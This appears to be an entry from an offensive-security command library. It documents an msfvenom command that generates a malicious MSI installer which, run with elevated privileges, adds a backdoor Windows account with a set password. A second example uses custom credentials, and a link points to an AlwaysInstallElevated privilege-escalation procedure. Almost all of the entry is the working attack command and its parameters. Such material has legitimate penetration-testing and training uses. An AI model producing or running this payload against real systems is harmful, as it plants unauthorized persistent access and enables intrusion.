---
id: 11694661-27b5-498a-8fb1-a3b358450a91
name: msfvenom-create-windows-adduser-msi
type: command
executor: bash
data: msfvenom -p windows/adduser USER=backdoor PASS=backdoor123 -f msi -o evil.msi
output: null
created_at: '2023-10-01T00:00:00.000000+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Linux
  - Windows
tags:
  - msfvenom
  - payload
  - privesc
verified: true
validated: true
---

# msfvenom-create-windows-adduser-msi

## Command

```bash
msfvenom -p windows/adduser USER=backdoor PASS=backdoor123 -f msi -o evil.msi
```

## Description

Generates a malicious MSI installer using msfvenom that creates a backdoor user account on Windows when executed with elevated privileges.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| -p windows/adduser | Payload type (adds user) | Yes |
| USER=backdoor | Username for backdoor | Yes |
| PASS=backdoor123 | Password for backdoor | Yes |
| -f msi | Output format (MSI installer) | Yes |
| -o evil.msi | Output file name | Yes |

## Examples

### Basic Usage

```bash
msfvenom -p windows/adduser USER=backdoor PASS=backdoor123 -f msi -o evil.msi
```

### Custom Credentials

```bash
msfvenom -p windows/adduser USER=admin2 PASS=P@ssw0rd! -f msi -o backdoor.msi
```

## Expected Output

No verbose console output; successfully creates 'evil.msi' file in current directory. Verify with 'ls -la evil.msi' or file explorer.

## Related

- [[tools/Metasploit-Framework]]
- [[procedures/Windows-AlwaysInstallElevated-Privilege-Escalation]]
